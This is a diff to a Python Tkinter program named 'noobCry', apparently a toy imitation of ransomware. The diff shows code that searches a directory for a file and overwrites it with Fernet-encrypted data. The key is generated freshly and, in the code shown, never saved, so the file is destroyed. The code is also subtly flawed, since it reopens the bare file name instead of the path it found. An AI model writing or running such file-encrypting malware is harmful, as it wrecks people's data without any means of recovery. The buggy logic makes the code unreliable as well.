@@ -11,8 +11,6 @@ class noobCry:
     #End __init__
     def attack(fileName,location):
         for root, dirs, files in os.walk(location, topdown=True):#This loop iterates over directories passed as the first argument, the second arg iterates from the top of directory
-            #for name in files:# This loop looks for the file name the user inputs
-                #print(os.path.join(root, name))#Print the structure of the directory
             if fileName in files:#If the file is found, it triggers the encryption here
                 key = Fernet.generate_key()#create key
                 f = Fernet(key)#create object to user the key
@@ -21,20 +19,17 @@ class noobCry:
                     encryptedFile = f.encrypt(fileData)#take the f object containing the key and use is the encrypt the target data
                     with open(fileName, "wb") as file:#open the file again using the "write bytes" built in function
                         file.write(encryptedFile)#write the encypted data to the file
-                        
+#End attack()
 
-                    
-    #End attack()
-    
-#implement a while to keep the inputs persistent
 #Gui Setup
 window = Tk()
 window.title("noobCry")
 window.geometry('500x200')
+
 #trollFace = PhotoImage(file = '2-2-trollface-picture-thumb')
 #window.iconphoto(False,trollFace)
 #Information label
-labelInfo = Label(window, text="Welcome to noobCry\nInputing the file name and location\n will encrypt the targetted file")
+labelInfo = Label(window, text="Welcome to noobCry.\nInputing the file name and location\n will encrypt the targetted file.")
 labelInfo.grid(column=0,row=6)
 #Name fields
 labelName = Label(window, text="Enter file name:")
